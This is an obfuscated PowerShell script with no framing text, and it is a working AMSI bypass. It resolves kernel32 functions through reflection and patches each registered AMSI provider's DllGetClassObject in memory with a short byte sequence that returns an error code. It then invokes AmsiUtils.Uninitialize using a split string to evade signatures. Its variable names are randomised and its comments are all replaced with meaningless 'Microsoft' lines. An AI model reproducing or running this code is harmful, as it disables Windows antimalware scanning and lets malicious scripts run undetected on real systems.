# Microsoft".
# Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".

function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $hnlrhOVYKDLqzqIajBANcXirfkNb,
        [Parameter(Position = 1, Mandatory = $True)] [String] $QgOQFrXvEBwwaCeYHbOoreJhsbRNeVqic
    )

    # Microsoft".
    $gMVHSMsnIeojVGCyuthkcG = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $ValpUwkJTkwkLfuaiSYxcaTYnpTGnJITWzdKAMU = $gMVHSMsnIeojVGCyuthkcG.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Microsoft".
    $bOXrHASfBWqDvslgTYktGNMYCvgcHF = $ValpUwkJTkwkLfuaiSYxcaTYnpTGnJITWzdKAMU.GetMethod('GetModuleHandle')
    $ECBrbyeDLZGpFOKYnKBakdIsqfRwxokSzZ = $ValpUwkJTkwkLfuaiSYxcaTYnpTGnJITWzdKAMU.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Microsoft".
    $CzUaAdxDQspVIaonnJkMYVsBQAqCHuBLQN = $bOXrHASfBWqDvslgTYktGNMYCvgcHF.Invoke($null, @($hnlrhOVYKDLqzqIajBANcXirfkNb))
    $TvjMRMScKTwsdqXmaWevxVjaugqFlEe = New-Object IntPtr
    $omvXmEYVboejGuiJTJmHkphHKWOYPnZwOogdDFs = New-Object System.Runtime.InteropServices.HandleRef($TvjMRMScKTwsdqXmaWevxVjaugqFlEe, $CzUaAdxDQspVIaonnJkMYVsBQAqCHuBLQN)
    # Microsoft".
    return $ECBrbyeDLZGpFOKYnKBakdIsqfRwxokSzZ.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$omvXmEYVboejGuiJTJmHkphHKWOYPnZwOogdDFs, $QgOQFrXvEBwwaCeYHbOoreJhsbRNeVqic))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $fAubluoUtYmPjOMGuZSjXLvYaSZYWlWIgpKDGSuW = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $qWRsPQSrloETscuNPUvLi = [Void]
    )

    $UoHjOVEeIdPhuUEwvResHMwI = [AppDomain]::CurrentDomain
    $HdyXogTASFQxtlySMKeK = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $dJRTEcAUOpNWmlBkYWuJBQrhensyItFevycNJiJffF = $UoHjOVEeIdPhuUEwvResHMwI.DefineDynamicAssembly($HdyXogTASFQxtlySMKeK, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $TMwnBiAVGqFPZRnnBesMawlITMbFzPVCREU = $dJRTEcAUOpNWmlBkYWuJBQrhensyItFevycNJiJffF.DefineDynamicModule('InMemoryModule', $false)
    $iuhyPjSykghUTQysLdFCVCPJWVPHy = $TMwnBiAVGqFPZRnnBesMawlITMbFzPVCREU.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $rmZjMteqcOtTFOKgunqCOtHUJiQlzrtUez = $iuhyPjSykghUTQysLdFCVCPJWVPHy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $fAubluoUtYmPjOMGuZSjXLvYaSZYWlWIgpKDGSuW)
    $rmZjMteqcOtTFOKgunqCOtHUJiQlzrtUez.SetImplementationFlags('Runtime, Managed')
    $rcehnSDDzOtwawSijaFpYyqAjcUWEqSzdxMSnZbULuYK = $iuhyPjSykghUTQysLdFCVCPJWVPHy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $qWRsPQSrloETscuNPUvLi, $fAubluoUtYmPjOMGuZSjXLvYaSZYWlWIgpKDGSuW)
    $rcehnSDDzOtwawSijaFpYyqAjcUWEqSzdxMSnZbULuYK.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $iuhyPjSykghUTQysLdFCVCPJWVPHy.CreateType()
}
$yNTnKguheFtVbjZlALYyCivQeYYTfbddJQcyyrQHXJMw = Get-ProcAddress kernel32.dll LoadLibraryA
$krpRPJlDEAUpIXckndDbTKlxGCQMyLCVXQIbiXirfL = Get-DelegateType @([String]) ([IntPtr])
$PYGWIvrGuojMqGrprgzybpIKtVBsUDWhwaRwvK = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yNTnKguheFtVbjZlALYyCivQeYYTfbddJQcyyrQHXJMw,
$krpRPJlDEAUpIXckndDbTKlxGCQMyLCVXQIbiXirfL)
$UlonZyIkAYIWfLrewpYdEpiEyWsjtTpli = Get-ProcAddress kernel32.dll GetProcAddress
$NtLAhBGPMcHZoPdkFEWiTbYtlpbmCFCYvjGjpt = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$ECBrbyeDLZGpFOKYnKBakdIsqfRwxokSzZ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UlonZyIkAYIWfLrewpYdEpiEyWsjtTpli,
$NtLAhBGPMcHZoPdkFEWiTbYtlpbmCFCYvjGjpt)
$dQjUDytccSvPJnOyogImwsCmggjCTYqJHqD = Get-ProcAddress kernel32.dll VirtualProtect
$fvsOOwBSXHLWfHGkQJjuKsqMoSCjGMHPN = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$JHoXVwaJxHwznJGRzaUnDYJYtlCJxvWDZqqrfpYt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($dQjUDytccSvPJnOyogImwsCmggjCTYqJHqD,
$fvsOOwBSXHLWfHGkQJjuKsqMoSCjGMHPN)

$YoSPsmDATedItasKspsuGjXqQRgCRYFObhUMP = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
$iEImbUyLOYzoScHYDwGOzAIbwlBtejqIvpsAvbamZSf = 0

foreach ($dKOWliGFIinklPKDYiIfEEQtgveOgUcOpqxgLDAQwxI in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $QLoLzPMlxVdFtIZlgpDbc = 'HKLM:\Software\Classes\CLSID\' + $dKOWliGFIinklPKDYiIfEEQtgveOgUcOpqxgLDAQwxI + '\InprocServer32'
    $ouAmQDDijORIqcKMKYrwhtqNcfeOEXHIuJoNGKcZ = Get-ItemPropertyValue -Name '(Default)' $QLoLzPMlxVdFtIZlgpDbc -ErrorAction SilentlyContinue
    if ($ouAmQDDijORIqcKMKYrwhtqNcfeOEXHIuJoNGKcZ)
    {
        $xJqfSakRtSanWWNGJQxXqcSkHFXmlFNwmwtJLudtGop = Split-Path $ouAmQDDijORIqcKMKYrwhtqNcfeOEXHIuJoNGKcZ -leaf
        $kYJsYnykKqKudugQWtRZeSwYZkEPzfzXPpvcw = $xJqfSakRtSanWWNGJQxXqcSkHFXmlFNwmwtJLudtGop -replace '"', ""
        $PUelmuiWXlZyWOJMntCNCBLEm = $PYGWIvrGuojMqGrprgzybpIKtVBsUDWhwaRwvK.Invoke($kYJsYnykKqKudugQWtRZeSwYZkEPzfzXPpvcw) 
        if ($PUelmuiWXlZyWOJMntCNCBLEm -ne 0)
        {
            Write-host "[*] Provider found - " $xJqfSakRtSanWWNGJQxXqcSkHFXmlFNwmwtJLudtGop
            $qCdqrWBXgsIcxnDvFBnBjpsc = $ECBrbyeDLZGpFOKYnKBakdIsqfRwxokSzZ.Invoke($PUelmuiWXlZyWOJMntCNCBLEm, "DllGetClassObject")        
            $JHoXVwaJxHwznJGRzaUnDYJYtlCJxvWDZqqrfpYt.Invoke($qCdqrWBXgsIcxnDvFBnBjpsc, [uint32]$YoSPsmDATedItasKspsuGjXqQRgCRYFObhUMP.Length, 0x40, [ref]$iEImbUyLOYzoScHYDwGOzAIbwlBtejqIvpsAvbamZSf)
            [System.Runtime.InteropServices.Marshal]::Copy($YoSPsmDATedItasKspsuGjXqQRgCRYFObhUMP, 0, $qCdqrWBXgsIcxnDvFBnBjpsc, $YoSPsmDATedItasKspsuGjXqQRgCRYFObhUMP.Length)
        }
    }
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$phVevAnanvoLbaqoBFybwAynzdBhoZAGdUpiqHelOPth = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$phVevAnanvoLbaqoBFybwAynzdBhoZAGdUpiqHelOPth.Invoke($object,$null)
